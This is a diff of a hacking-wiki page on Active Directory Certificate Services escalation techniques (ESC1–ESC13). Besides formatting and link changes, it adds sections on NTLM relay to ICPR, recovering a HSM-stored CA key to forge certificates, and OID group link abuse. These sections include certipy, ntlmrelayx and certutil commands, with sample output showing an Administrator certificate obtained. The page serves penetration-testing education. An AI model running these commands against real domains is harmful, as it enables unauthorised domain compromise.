@@ -2,19 +2,24 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.khulnasoft.com/courses/arte"><strong>htARTE (ByteBreach AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.bytebreach.xyz/courses/arte"><strong>htARTE (ByteBreach AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Other ways to support ByteBreach:
 
 * If you want to see your **company advertised in ByteBreach** or **download ByteBreach in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/khulnasoft)!
 * Get the [**official PEASS & ByteBreach swag**](https://peass.creator-spring.com)
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@khulnasoftm**](https://twitter.com/bytebreach_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@khulnasoftm**](https://twitter.com/bytebreach\_live)**.**
 * **Share your hacking tricks by submitting PRs to the** [**ByteBreach**](https://github.com/khulnasoft/bytebreach) and [**ByteBreach Cloud**](https://github.com/khulnasoft/bytebreach-cloud) github repos.
 
 </details>
 
-**This is a summary of escalation technique sections of the posts:** 
+<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
+**This is a summary of escalation technique sections of the posts:**
+
 * [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
 * [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
 * [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
@@ -109,19 +114,19 @@ The **“enrollment agent”** enrolls in such a **template** and uses the resul
 
 **Requirements 1:**
 
-- Enrollment rights are granted to low-privileged users by the Enterprise CA.
-- The requirement for manager approval is omitted.
-- No requirement for authorized signatures.
-- The security descriptor of the certificate template is excessively permissive, granting enrollment rights to low-privileged users.
-- The certificate template includes the Certificate Request Agent EKU, enabling the request of other certificate templates on behalf of other principals.
+* Enrollment rights are granted to low-privileged users by the Enterprise CA.
+* The requirement for manager approval is omitted.
+* No requirement for authorized signatures.
+* The security descriptor of the certificate template is excessively permissive, granting enrollment rights to low-privileged users.
+* The certificate template includes the Certificate Request Agent EKU, enabling the request of other certificate templates on behalf of other principals.
 
 **Requirements 2:**
 
-- The Enterprise CA grants enrollment rights to low-privileged users.
-- Manager approval is bypassed.
-- The template's schema version is either 1 or exceeds 2, and it specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
-- An EKU defined in the certificate template permits domain authentication.
-- Restrictions for enrollment agents are not applied on the CA.
+* The Enterprise CA grants enrollment rights to low-privileged users.
+* Manager approval is bypassed.
+* The template's schema version is either 1 or exceeds 2, and it specifies an Application Policy Issuance Requirement that necessitates the Certificate Request Agent EKU.
+* An EKU defined in the certificate template permits domain authentication.
+* Restrictions for enrollment agents are not applied on the CA.
 
 ### Abuse
 
@@ -155,17 +160,17 @@ Should an **attacker** possess the requisite **permissions** to **alter** a **te
 
 Notable permissions applicable to certificate templates include:
 
-- **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.
-- **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.
-- **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.
-- **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
-- **WriteProperty:** Authorizes the editing of any object properties.
+* **Owner:** Grants implicit control over the object, allowing for the modification of any attributes.
+* **FullControl:** Enables complete authority over the object, including the capability to alter any attributes.
+* **WriteOwner:** Permits the alteration of the object's owner to a principal under the attacker's control.
+* **WriteDacl:** Allows for the adjustment of access controls, potentially granting an attacker FullControl.
+* **WriteProperty:** Authorizes the editing of any object properties.
 
 ### Abuse
 
 An example of a privesc like the previous one:
 
-<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>
 
 ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.
 
@@ -407,23 +412,22 @@ Another limitation of NTLM relay attacks is that **an attacker-controlled machin
 Certify.exe cas
 ```
 
-<figure><img src="../../../.gitbook/assets/image (6) (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>
 
 The `msPKI-Enrollment-Servers` property is used by enterprise Certificate Authorities (CAs) to store Certificate Enrollment Service (CES) endpoints. These endpoints can be parsed and listed by utilizing the tool **Certutil.exe**:
-
 
 ```
 certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2) (2) (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>
 
 ```powershell
 Import-Module PSPKI
 Get-CertificationAuthority | select Name,Enroll* | Format-List *
 ```
 
-<figure><img src="../../../.gitbook/assets/image (8) (2) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>
 
 #### Abuse with Certify
 
@@ -461,17 +465,18 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Exiting...
 ```
 
-## No Security Extension - ESC9 <a href="#5485" id="5485"></a>
+## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>
 
 ### Explanation
 
 The new value **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) for **`msPKI-Enrollment-Flag`**, referred to as ESC9, prevents the embedding of the **new `szOID_NTDS_CA_SECURITY_EXT` security extension** in a certificate. This flag becomes relevant when `StrongCertificateBindingEnforcement` is set to `1` (the default setting), which contrasts with a setting of `2`. Its relevance is heightened in scenarios where a weaker certificate mapping for Kerberos or Schannel might be exploited (as in ESC10), given that the absence of ESC9 would not alter the requirements.
 
 The conditions under which this flag's setting becomes significant include:
-- `StrongCertificateBindingEnforcement` is not adjusted to `2` (with the default being `1`), or `CertificateMappingMethods` includes the `UPN` flag.
-- The certificate is marked with the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` setting.
-- Any client authentication EKU is specified by the certificate.
-- `GenericWrite` permissions are available over any account to compromise another.
+
+* `StrongCertificateBindingEnforcement` is not adjusted to `2` (with the default being `1`), or `CertificateMappingMethods` includes the `UPN` flag.
+* The certificate is marked with the `CT_FLAG_NO_SECURITY_EXTENSION` flag within the `msPKI-Enrollment-Flag` setting.
+* Any client authentication EKU is specified by the certificate.
+* `GenericWrite` permissions are available over any account to compromise another.
 
 ### Abuse Scenario
 
@@ -511,15 +516,14 @@ Attempting authentication with the issued certificate now yields the NT hash of 
 certipy auth -pfx adminitrator.pfx -domain corp.local
 ```
 
-
 ## Weak Certificate Mappings - ESC10
 
 ### Explanation
 
 Two registry key values on the domain controller are referred to by ESC10:
 
-- The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
-- The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.
+* The default value for `CertificateMappingMethods` under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` is `0x18` (`0x8 | 0x10`), previously set to `0x1F`.
+* The default setting for `StrongCertificateBindingEnforcement` under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` is `1`, previously `0`.
 
 **Case 1**
 
@@ -607,6 +611,135 @@ certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
 
 This vulnerability also extends to any user account lacking a `userPrincipalName` or where it does not match the `sAMAccountName`, with the default `Administrator@corp.local` being a prime target due to its elevated LDAP privileges and the absence of a `userPrincipalName` by default.
 
+## Relaying NTLM to ICPR - ESC11
+
+### Explanation
+
+If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).
+
+You can use `certipy` to enumerate if `Enforce Encryption for Requests` is Disabled and certipy will show `ESC11` Vulnerabilities.
+
+```bash
+$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+Certificate Authorities
+  0
+    CA Name                             : DC01-CA
+    DNS Name                            : DC01.domain.local
+    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
+    ....
+    Enforce Encryption for Requests     : Disabled
+    ....
+    [!] Vulnerabilities
+      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue
+
+```
+
+### Abuse Scenario
+
+It need to setup a relay server: 
+
+``` bash
+$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting rpc://DC01.domain.local (ESC11)
+[*] Listening on 0.0.0.0:445
+[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
+[*] Attacking user 'Administrator@DOMAIN'
+[*] Template was not defined. Defaulting to Machine/User
+[*] Requesting certificate for user 'Administrator' with template 'User'
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 10
+[*] Got certificate with UPN 'Administrator@domain.local'
+[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
+[*] Saved certificate and private key to 'administrator.pfx'
+[*] Exiting...
+```
+
+Note: For domain controllers, we must specify `-template` in DomainController.
+
+Or using [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :
+
+``` bash
+$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
+```
+
+## Shell access to ADCS CA with YubiHSM - ESC12
+
+### Explanation
+
+Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".
+
+If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM. 
+
+This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.
+
+Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).
+
+### Abuse Scenario
+
+If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.
+
+In first, you need to obtain the CA certificate (this is public) and then:  
+
+```cmd
+# import it to the user store with CA certificate
+$ certutil -addstore -user my <CA certificate file>
+
+# Associated with the private key in the YubiHSM2 device
+$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
+```
+
+Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.
+
+
+## OID Group Link Abuse - ESC13
+
+### Explanation
+
+The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
+
+In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group. 
+
+Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:
+
+```powershell
+Enumerating OIDs
+------------------------
+OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+
+OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
+OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+------------------------
+Enumerating certificate templates
+------------------------
+Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+
+Certificate template Name: VulnerableTemplate
+OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
+OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
+OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
+------------------------
+```
+
+### Abuse Scenario
+
+Find a user permission it can use `certipy find` or `Certify.exe find /showAllPermissions`.
+
+If `John` have have permission to enroll `VulnerableTemplate`,  the user can inherit the privileges of `VulnerableGroup` group. 
+
+All it need to do just specify the template, it will get a certificate with OIDToGroupLink rights.
+
+```bash
+certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
+```
+
 
 ## Compromising Forests with Certificates Explained in Passive Voice
 
@@ -621,16 +754,20 @@ Upon authentication across a trust, the **Authenticated Users SID** is added to 
 
 Both scenarios lead to an **increase in the attack surface** from one forest to another. The settings of the certificate template could be exploited by an attacker to obtain additional privileges in a foreign domain.
 
+<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://websec.nl/" %}
+
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.khulnasoft.com/courses/arte"><strong>htARTE (ByteBreach AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.bytebreach.xyz/courses/arte"><strong>htARTE (ByteBreach AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Other ways to support ByteBreach:
 
 * If you want to see your **company advertised in ByteBreach** or **download ByteBreach in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/khulnasoft)!
 * Get the [**official PEASS & ByteBreach swag**](https://peass.creator-spring.com)
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@khulnasoftm**](https://twitter.com/bytebreach_live)**.**
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@khulnasoftm**](https://twitter.com/bytebreach\_live)**.**
 * **Share your hacking tricks by submitting PRs to the** [**ByteBreach**](https://github.com/khulnasoft/bytebreach) and [**ByteBreach Cloud**](https://github.com/khulnasoft/bytebreach-cloud) github repos.
 
 </details>
